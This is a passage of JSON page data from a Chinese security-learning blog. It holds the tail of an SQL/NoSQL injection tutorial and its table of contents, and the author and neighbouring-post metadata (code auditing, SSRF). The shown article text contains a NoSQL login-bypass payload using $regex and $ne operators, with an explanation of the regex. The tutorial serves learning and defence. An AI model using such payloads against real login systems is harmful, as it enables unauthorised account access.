punctuation\">[</span><span class=\"token operator\">^</span>admin<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span>$<span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span>$ne<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">^[^admin].*$的话这个就随便作为字符，因为*是全部<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个payload需要熟悉一下正则表达式的部分知识</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">^</span>的作用\n<span class=\"token number\">1</span>、限定开头\n<span class=\"token operator\">^</span>匹配后面紧跟的字符为开头的字符（<span class=\"token punctuation\">[</span> <span class=\"token punctuation\">]</span>之外或数字、元字符之前），如<span class=\"token operator\">^</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>，含义为以<span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token number\">9</span>中的数字为第一个数字开头。\n<span class=\"token number\">2</span>、取反:\n当这个字符出现在一个字符集合模式（<span class=\"token punctuation\">[</span> <span class=\"token punctuation\">]</span>之内）的第一个字符时，表示为取反。如<span class=\"token punctuation\">[</span><span class=\"token operator\">^</span><span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>，表示为匹配除了数字以外的字符。\n$的作用\n表示从字符串末尾进行匹配。\n如<span class=\"token operator\">/</span><span class=\"token operator\">^</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>&#123;<span class=\"token number\">8</span>&#125;$<span class=\"token operator\">/</span>，表示为字符串以数字为结尾字符。\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","feature":true,"text":"前言在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助 漏洞相关信息漏洞成因程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 定义web应用程序对用户输入数据的合法性没有判断...","link":"","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"27 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":2,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">漏洞相关信息</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B%EF%BC%88%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%E5%88%86%E7%B1%BB%EF%BC%89\"><span class=\"toc-text\">sql注入常见类型（按照执行效果分类）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">联合查询注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">布尔盲注</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">时间盲注</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">报错注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">堆叠注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">宽字节注入</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">相关知识介绍</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%87%E8%83%BD%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">万能语句</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E4%B8%B2\"><span class=\"toc-text\">md5特殊字符串</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nosql%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">nosql注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#limit%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">limit注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E4%BB%A5%E7%9B%B8%E4%BA%92%E6%9B%BF%E4%BB%A3%E7%9A%84%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">可以相互替代的函数总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4\"><span class=\"toc-text\">时间盲注中的时间</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99\"><span class=\"toc-text\">布尔盲注中的正则</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E4%B8%AD%E7%9A%84where\"><span class=\"toc-text\">联合查询中的where</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">注入实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">联合查询</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1\"><span class=\"toc-text\">布尔盲注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-1\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-1\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%AD%A3%E5%88%99%E7%89%88%EF%BC%89\"><span class=\"toc-text\">0X03（布尔盲注正则版）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1\"><span class=\"toc-text\">时间盲注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E7%89%88\"><span class=\"toc-text\">0X01(时间盲注笛卡尔积版)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-2\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03%EF%BC%88%E4%BA%8C%E5%88%86%E6%B3%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89\"><span class=\"toc-text\">0X03（二分法时间盲注）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">报错注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-2\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-3\"><span class=\"toc-text\">0X02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">堆叠注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-3\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-4\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03-1\"><span class=\"toc-text\">0X03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">二次注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">宽字节注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-4\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-5\"><span class=\"toc-text\">0X02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#limit%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">limit注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#md5%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">md5注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nosql%E6%B3%A8%E5%85%A5-1\"><span class=\"toc-text\">nosql注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-5\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-6\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03-2\"><span class=\"toc-text\">0X03</span></a></li></ol></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"小白的代码审计初始之路","uid":"bf43e15989ef186ce3f8420a1b97dea6","slug":"小白的代码审计之路","date":"2022-07-05T10:45:30.000Z","updated":"2024-02-14T07:48:04.000Z","comments":true,"path":"api/articles/小白的代码审计之路.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141526491.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11553 代码审计概念什么是代码审计？ 代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从一文中了解SSRF的各种绕过姿势及攻击思路","uid":"5fdc9b0e6b2ac7fe212943a2f6d06f72","slug":"从一文了解SSRF的各种绕过姿势及攻击思路","date":"2022-07-04T04:04:10.000Z","updated":"2023-03-14T08:05:34.000Z","comments":true,"path":"api/articles/从一文了解SSRF的各种绕过姿势及攻击思路.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141513830.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1648/ 前言SSRF之前只有简单了解，进行二次学习后简单总结一下，希望能对正在学习SSRF的师傅们有所帮助 漏洞相关信息漏洞成因SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SSRF","slug":"SSRF","count":1,"path":"api/tags/SSRF.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}